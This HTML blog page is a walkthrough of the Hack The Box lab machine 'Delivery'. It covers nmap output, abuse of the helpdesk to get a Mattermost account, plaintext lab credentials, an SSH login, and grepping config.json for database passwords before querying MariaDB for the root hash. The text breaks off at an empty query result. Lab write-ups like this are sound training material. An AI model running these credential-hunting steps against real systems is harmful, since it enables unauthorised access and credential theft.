<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Delivery :: Research blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="NMAP # Nmap 7.91 scan initiated Tue Mar 2 19:09:11 2021 as: nmap -sV -A -p- -oN nmap.txt 10.10.10.222 Nmap scan report for delivery.htb (10.10.10.222) Host is up (0.094s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA) | 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA) |_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome 8065/tcp open unknown | fingerprint-strings: | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/delivery/" />




<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">

  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Delivery :: Research blog">
<meta property="og:description" content="Hack The Box machine" />
<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/delivery/" />
<meta property="og:site_name" content="Delivery" />

  <meta property="og:image" content="https://thomas-byrne.co.uk">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    /home
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/hackthebox">HackTheBox</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Show more â–¾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/oscp">OSCP</a></li>
              
            
              
                <li><a href="/projects">Projects</a></li>
              
            
              
                <li><a href="/research">Research</a></li>
              
            
              
                <li><a href="/showcase">Showcase</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/hackthebox">HackTheBox</a></li>
      
    
      
        <li><a href="/oscp">OSCP</a></li>
      
    
      
        <li><a href="/projects">Projects</a></li>
      
    
      
        <li><a href="/research">Research</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://thomas-byrne.co.uk/hackthebox/delivery/">Delivery</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-07-09 
      </span>
    
    
    <span class="post-author">:: Tom</span>
    
  </div>

  

  
    <img src="https://thomas-byrne.co.uk" class="post-cover" alt="Delivery" />
  

  

  <div class="post-content"><div>
        <h2 id="nmap">NMAP<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Tue Mar  2 19:09:11 2021 as: nmap -sV -A -p- -oN nmap.txt 10.10.10.222</span>
Nmap scan report <span style="color:#66d9ef">for</span> delivery.htb <span style="color:#f92672">(</span>10.10.10.222<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.094s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65532</span> closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age<span style="color:#f92672">=</span>31556926, public
|     Content-Length: <span style="color:#ae81ff">3108</span>
|     Content-Security-Policy: frame-ancestors <span style="color:#e6db74">&#39;self&#39;</span>; script-src <span style="color:#e6db74">&#39;self&#39;</span> cdn.rudderlabs.com
|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
|     Last-Modified: Tue, <span style="color:#ae81ff">02</span> Mar <span style="color:#ae81ff">2021</span> 11:58:25 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: u96uohgmz3rc7jyu9acf6m4jgc
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Tue, <span style="color:#ae81ff">02</span> Mar <span style="color:#ae81ff">2021</span> 19:29:03 GMT
|     &lt;!doctype html&gt;&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;&lt;head&gt;&lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;robots&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;noindex, nofollow&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;referrer&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no-referrer&#34;</span>&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mobile-web-app-capable&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yes&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;application-name&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mattermost&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;format-detection&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;telephone=no&#34;</span>&gt;&lt;link re
|   HTTPOptions: 
|     HTTP/1.0 <span style="color:#ae81ff">405</span> Method Not Allowed
|     Date: Tue, <span style="color:#ae81ff">02</span> Mar <span style="color:#ae81ff">2021</span> 19:29:03 GMT
|_    Content-Length: <span style="color:#ae81ff">0</span>
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V<span style="color:#f92672">=</span>7.91%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>3/2%Time<span style="color:#f92672">=</span>603E8FC1%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Gen
SF:ericLines,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
</span><span style="color:#e6db74">SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
</span><span style="color:#e6db74">SF:0Request&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,DF3,<span style="color:#e6db74">&#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x
</span><span style="color:#e6db74">SF:20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20public\r
</span><span style="color:#e6db74">SF:\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-ancestor
</span><span style="color:#e6db74">SF:s\x20&#39;self&#39;;\x20script-src\x20&#39;self&#39;\x20cdn\.rudderlabs\.com\r\nContent
</span><span style="color:#e6db74">SF:-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Tue,\x2002\x
</span><span style="color:#e6db74">SF:20Mar\x202021\x2011:58:25\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX
</span><span style="color:#e6db74">SF:-Request-Id:\x20u96uohgmz3rc7jyu9acf6m4jgc\r\nX-Version-Id:\x205\.30\.0
</span><span style="color:#e6db74">SF:\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Tue,\x2
</span><span style="color:#e6db74">SF:002\x20Mar\x202021\x2019:29:03\x20GMT\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x2
</span><span style="color:#e6db74">SF:0lang=\&#34;en\&#34;&gt;&lt;head&gt;&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;&lt;meta\x20name=\&#34;viewport\
</span><span style="color:#e6db74">SF:&#34;</span><span style="color:#ae81ff">\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,initial-scale<span style="color:#f92672">=</span>1,maximum-scale<span style="color:#f92672">=</span>1,user-
SF:scalable<span style="color:#f92672">=</span>0<span style="color:#ae81ff">\&#34;</span>&gt;&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>robots<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>noindex,<span style="color:#ae81ff">\x</span>20nofollow
SF:<span style="color:#ae81ff">\&#34;</span>&gt;&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>referrer<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>no-referrer<span style="color:#ae81ff">\&#34;</span>&gt;&lt;title&gt;Matterm
SF:ost&lt;/title&gt;&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>mobile-web-app-capable<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>yes<span style="color:#ae81ff">\&#34;</span>&gt;
SF:&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>application-name<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Mattermost<span style="color:#ae81ff">\&#34;</span>&gt;&lt;meta<span style="color:#ae81ff">\x</span>20n
SF:ame<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>format-detection<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>telephone<span style="color:#f92672">=</span>no<span style="color:#ae81ff">\&#34;</span>&gt;&lt;link<span style="color:#ae81ff">\x</span>20re<span style="color:#e6db74">&#34;)%r(HT
</span><span style="color:#e6db74">SF:TPOptions,5B,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20405<span style="color:#ae81ff">\x</span>20Method<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Allowed<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
SF:Tue,<span style="color:#ae81ff">\x</span>2002<span style="color:#ae81ff">\x</span>20Mar<span style="color:#ae81ff">\x</span>202021<span style="color:#ae81ff">\x</span>2019:29:03<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>200<span style="color:#ae81ff">\r\
</span><span style="color:#ae81ff"></span>SF:n<span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;)%r(RTSPRequest,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content
SF:-Type:<span style="color:#ae81ff">\x</span>20text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#ae81ff">4</span>
SF:00<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#e6db74">&#34;)%r(Help,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\
</span><span style="color:#ae81ff"></span>SF:nContent-Type:<span style="color:#ae81ff">\x</span>20text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>SF:r<span style="color:#ae81ff">\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#e6db74">&#34;)%r(SSLSessionReq,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
SF:Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Conn
SF:ection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#e6db74">&#34;)%r(TerminalServerCookie,
</span><span style="color:#e6db74">SF:67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/plain;<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>SF:x20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#e6db74">&#34;);
</span><span style="color:#e6db74">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
</span><span style="color:#e6db74">TCP/IP fingerprint:
</span><span style="color:#e6db74">OS:SCAN(V=7.91%E=4%D=3/2%OT=22%CT=1%CU=30438%PV=Y%DS=2%DC=T%G=Y%TM=603E9026
</span><span style="color:#e6db74">OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(
</span><span style="color:#e6db74">OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
</span><span style="color:#e6db74">OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
</span><span style="color:#e6db74">OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
</span><span style="color:#e6db74">OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
</span><span style="color:#e6db74">OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
</span><span style="color:#e6db74">OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
</span><span style="color:#e6db74">OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
</span><span style="color:#e6db74">OS:S)
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Network Distance: 2 hops
</span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">TRACEROUTE (using port 80/tcp)
</span><span style="color:#e6db74">HOP RTT      ADDRESS
</span><span style="color:#e6db74">1   95.08 ms 10.10.14.1
</span><span style="color:#e6db74">2   95.51 ms delivery.htb (10.10.10.222)
</span></code></pre></div><h2 id="reconnaissance">Reconnaissance<a href="#reconnaissance" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p><img src="images/delivery-landingpage.png" alt="landingPage"></p>
<p><img src="images/delivery-recon1.png" alt="recon"></p>
<p><img src="/images/delivery-recon2.png" alt="recon2"></p>
<p><img src="/images/delivery-recon3.png" alt="recon3"></p>
<p>It looks like we have a few websites that we can do things with. From what the webpage says it looks as though we need to register an account via the helpdesk to gain access to the mattermost server as we need a &ldquo;@delivery.htb&rdquo; email address.</p>
<p>&ldquo;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, youâ€™ll be able to have access to our MatterMost server.&rdquo;</p>
<p>Lets play about with the ticketing system and see what happens.</p>
<p><img src="/images/delivery-ticketingsystem.png" alt="ticketingsystem"></p>
<p>It looks as though it generates a @delivery.htb. email address from our ticket number? Maybe i can log into mattermost with this? (even though i don&rsquo;t have a password)</p>
<p><img src="/images/delivery-ticketingsystem2.png" alt="ticketingsystem2">
Register at mattermost with the delivery.htb email we got from OSticket and then boom we get the confirmation email.</p>
<h2 id="html-injection">HTML injection<a href="#html-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>We can post a message and get HTML injection. Not really much we can do with this.</p>
<p><img src="/images/htmlinjection1.png" alt="htmlinjection1">
<img src="/images/htmlinjection2.png" alt="htmlinjection2"></p>
<h2 id="mattermost">Mattermost<a href="#mattermost" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Anyway we got into mattermost 
clientVersion=5.30.0</p>
<p><img src="/images/delivery-slack.png" alt="slackcreds"></p>
<p>we have creds!</p>
<table>
<thead>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>maildeliverer</td>
<td>Youve_G0t_Mail!</td>
</tr>
<tr>
<td>?</td>
<td>PleaseSubscribe!</td>
</tr>
<tr>
<td>mmuser</td>
<td>Crack_The_MM_Admin_PW</td>
</tr>
</tbody>
</table>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”€â”€<span style="color:#f92672">(</span>tomã‰¿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt<span style="color:#f92672">]</span>                                                                                  
â””â”€$ ssh maildeliverer@10.10.10.222                                                                 <span style="color:#ae81ff">1</span> â¨¯ 
The authenticity of host <span style="color:#e6db74">&#39;10.10.10.222 (10.10.10.222)&#39;</span> can<span style="color:#e6db74">&#39;t be established.                           
</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.                           
</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                               
</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.10.222<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.    
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">maildeliverer@10.10.10.222&#39;</span>s password:                                                                 
Linux Delivery 4.19.0-13-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64                            </span>
  
The programs included with the Debian GNU/Linux system are free software;                              
the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the                                     
individual files in /usr/share/doc/*/copyright.               
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                      
permitted by applicable law.                                                                           
Last login: Tue Jan  <span style="color:#ae81ff">5</span> 06:09:50 <span style="color:#ae81ff">2021</span> from 10.10.14.5  

maildeliverer@Delivery:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>maildeliverer<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>maildeliverer<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>maildeliverer<span style="color:#f92672">)</span>
maildeliverer@Delivery:~$ 

</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/mattermost/logs
/opt/mattermost/logs/mattermost.log
</code></pre></div><h2 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>create variations of PleaseSubscribe! and use that as a wordlist to crack root hash</p>
<blockquote>
<p>got this from hint in mattermost post</p>
</blockquote>
<p>There are no obvious signs of a low hanging fruit. No sudo access and no weird configurations that stand out on the box. From the hint we know we need a hash. Where are hashes usually stored? In a database&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">maildeliverer@Delivery:/opt/mattermost/config$ netstat -tulpn | grep LISTEN
<span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:1025          0.0.0.0:*               LISTEN      -                   
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::80                   :::*                    LISTEN      -                   
tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -                   
tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> ::1:631                 :::*                    LISTEN      -                   
tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::8065                 :::*                    LISTEN      -  
</code></pre></div><p>So we know mysql is running locally from the 127.0.0.1:3306 (port 3306 is default mysql port which is listening).</p>
<p>root hash is probably in the mysql database.
However, we cannot access the mysql database as maildeliverer or root as root logon is protected. So we need to find creds to get access. Since we know OSTicket and Mattermost are both running on the box and both most likely need a database it would be sensible to look in these logs or config files for any signs of creds.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">maildeliverer@Delivery:/opt/mattermost/config$ mysql -u maildeliverer -p
Enter password: 
ERROR <span style="color:#ae81ff">1698</span> <span style="color:#f92672">(</span>28000<span style="color:#f92672">)</span>: Access denied <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;maildeliverer&#39;</span>@<span style="color:#e6db74">&#39;localhost&#39;</span>

</code></pre></div><p>No matter what password we use we get access denied.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">maildeliverer@Delivery:/opt/mattermost/config$ cat config.json| grep user
        <span style="color:#e6db74">&#34;TeammateNameDisplay&#34;</span>: <span style="color:#e6db74">&#34;username&#34;</span>,
        <span style="color:#e6db74">&#34;DataSource&#34;</span>: <span style="color:#e6db74">&#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;</span>,
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;SqlSettings&#34;</span>: <span style="color:#f92672">{</span>
        <span style="color:#e6db74">&#34;DriverName&#34;</span>: <span style="color:#e6db74">&#34;mysql&#34;</span>,
        <span style="color:#e6db74">&#34;DataSource&#34;</span>: <span style="color:#e6db74">&#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;</span>,
        <span style="color:#e6db74">&#34;DataSourceReplicas&#34;</span>: <span style="color:#f92672">[]</span>,
        <span style="color:#e6db74">&#34;DataSourceSearchReplicas&#34;</span>: <span style="color:#f92672">[]</span>,
        <span style="color:#e6db74">&#34;MaxIdleConns&#34;</span>: 20,
        <span style="color:#e6db74">&#34;ConnMaxLifetimeMilliseconds&#34;</span>: 3600000,
        <span style="color:#e6db74">&#34;MaxOpenConns&#34;</span>: 300,
        <span style="color:#e6db74">&#34;Trace&#34;</span>: false,
        <span style="color:#e6db74">&#34;AtRestEncryptKey&#34;</span>: <span style="color:#e6db74">&#34;n5uax3d4f919obtsp1pw1k5xetq1enez&#34;</span>,
        <span style="color:#e6db74">&#34;QueryTimeout&#34;</span>: 30,
        <span style="color:#e6db74">&#34;DisableDatabaseSearch&#34;</span>: false
    <span style="color:#f92672">}</span>,
</code></pre></div><p>Looking through the log files evertually i stumbled across this. Because looking line by line through each file would be ardueous i needed to use some grepping and filtering.  i eventually hit the word &ldquo;user&rdquo; which was good considering my first search of &ldquo;pass&rdquo; and &ldquo;password&rdquo; didn&rsquo;t hit anything. Since i was looking for some mysql details i could have hit the same thing using mysql or database.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">maildeliverer@Delivery:/opt/mattermost$ mysql -u  mmuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
Your MariaDB connection id is <span style="color:#ae81ff">371</span>
Server version: 10.3.27-MariaDB-0+deb10u1 Debian <span style="color:#ae81ff">10</span>

Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span style="color:#e6db74">&#39;help;&#39;</span> or <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> to clear the current input statement.

MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; use mattermost
Reading table information <span style="color:#66d9ef">for</span> completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

</code></pre></div><p>I used the password from the config file. Now i need to find the hash</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ariaDB <span style="color:#f92672">[</span>mattermost<span style="color:#f92672">]</span>&gt; <span style="color:#66d9ef">select</span> username, password from Users where username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;root&#39;</span>;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
